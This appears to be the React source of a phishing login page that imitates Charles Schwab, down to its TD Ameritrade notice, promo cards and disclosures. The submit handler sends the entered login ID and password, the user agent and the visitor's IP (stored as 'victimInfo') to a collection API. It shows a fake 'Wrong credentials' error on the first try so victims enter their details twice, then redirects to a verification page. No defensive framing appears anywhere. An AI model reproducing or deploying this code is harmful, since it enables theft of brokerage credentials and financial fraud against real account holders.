import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { FaCircleInfo } from "react-icons/fa6";
import { IoEyeOffOutline, IoEyeOff } from "react-icons/io5";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const CARDS = [
  {
    image: "/images/promo1.avif",
    title: "Invest in ideas you believe in.",
    desc: "Find new opportunities with 40+ customizable themes.",
  },
  {
    image: "/images/promo2.avif",
    title: "Could a professional trustee help you achieve your goals?",
    desc: "Plan ahead and simplify.",
  },
  {
    image: "/images/promo3.avif",
    title: "Is our robo-advisor right for you?",
    desc: "Schwab Intelligent Portfolios® does the work, so you don’t have to.",
  },
];

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "Charles Schwab",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <>
      <div className="bg-[#e5f8ff] border border-[#006e99] w-full mt-3 p-4 flex gap-3">
        <FaCircleInfo
          fill="#006e99"
          size={28}
          className="min-w-6"
        />
        <p className="font-medium">
          <span className="font-bold">
            Recently moved here from TD Ameritrade?
          </span>{" "}
          Log in below to get started and complete your Schwab client profile.
          If you haven’t already, you'll need to{" "}
          <span className="text-[#006e99]">
            create your Schwab Login ID and password first
          </span>
          .
        </p>
      </div>

      <FormLayout
        handleSubmit={handleSubmit}
        title="Log in to Schwab"
      >
        <Input
          title="Login ID"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        />
        <Input
          title="Password"
          type={!isShowPass ? "password" : "text"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        >
          <span
            className="absolute top-8 right-2"
            onClick={() => setIsShowPass((prev) => !prev)}
          >
            {!isShowPass ? (
              <IoEyeOff
                fontSize={22}
                fill="#005f83"
              />
            ) : (
              <IoEyeOffOutline
                fontSize={22}
                fill="#005f83"
              />
            )}
          </span>
        </Input>
        <div className="flex gap-1 items-center">
          <input
            id="checkbox"
            type="checkbox"
            className="rounded-md border-[1px] size-3"
          />
          <label
            htmlFor="checkbox"
            className="font-[600] text-[15px]"
          >
            Remember User ID
          </label>
        </div>

        <p className="font-medium mt-[2px] mb-1">Start Page</p>
        <select
          className="pl-2 focus:border-[#005f83] hover:border-[#005f83] border border-[#b1b1b1] h-7 rounded-[3px] w-full text-sm"
          style={{
            background: "linear-gradient(-180deg, #fafafa 0%, #e4e4e4 99%)",
          }}
        >
          <option>Accounts Summary</option>
          <option>Account Balances</option>
          <option>Positions</option>
          <option>Trade Ticket</option>
          <option>History</option>
          <option>Stock &amp; ETF Trading</option>
          <option>Options Trading</option>
          <option>Mutual Fund Trading</option>
          <option>Bond Trading</option>
          <option>Research</option>
          <option>Order Status</option>
        </select>

        {isWrong && (
          <div
            role="alert"
            className="mt-3 alert alert-error my-4 rounded-lg bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}

        <Button
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              "Log In"
            )
          }
        />
        <div className="flex items-center justify-center gap-1 text-base mt-3">
          Forgot
          <a
            href="#"
            className="text-[#005f83] text-base font-[500]"
          >
            Login ID
          </a>
          or
          <a
            href="#"
            className="text-[#005f83] text-base font-[500]"
          >
            Password
          </a>
        </div>
        <div className="flex items-center justify-center gap-3 mt-1">
          <a
            href="#"
            className="text-[#005f83] text-base font-[500]"
          >
            New User?
          </a>

          <div className="w-[1px] h-6 bg-[#cccccc]"></div>
          <select className="rounded-[0.375rem] border border-[#4f5a64] h-8 text-base px-2">
            <option>English</option>
            <option>繁體</option>
            <option>简体</option>
          </select>
        </div>
      </FormLayout>

      {/* Cards  */}
      <div className="flex gap-4 flex-wrap py-4">
        {CARDS?.map((itm, idx) => (
          <div
            key={idx}
            className="rounded-[10px] md:flex-1 max-md:w-full overflow-hidden"
            style={{
              boxShadow:
                "0 4px 5px rgba(0,0,0,.15),0 1px 10px rgba(0,0,0,.12),0 2px 4px -1px rgba(0,0,0,.3)",
            }}
          >
            <img
              src={itm.image}
              alt={itm.title}
              className="w-full"
            />
            <div className="p-3">
              <h2 className="text-lg font-semibold">{itm.title}</h2>
              <p>{itm.desc}</p>
            </div>
          </div>
        ))}
      </div>

      <div className="bg-[#f1f1f1] w-full mt-3 p-4">
        <h3 className="mb-2">
          <span className="font-bold">
            Important information about our relationship with you: Client
            Relationship Summaries:
          </span>
          <span className="text-[#006e99] ml-1">
            Client Relationship Summaries
          </span>
        </h3>
        <p className="font-medium">
          Our Client Relationship Summaries offer a brief summary of our
          services, fees and obligations when we work with you in a
          broker-dealer or an investment advisory relationship. Learn more at{" "}
          <span className="text-[#006e99]">schwab.com/transparency.</span>
        </p>
      </div>
    </>
  );
};

export default Login;
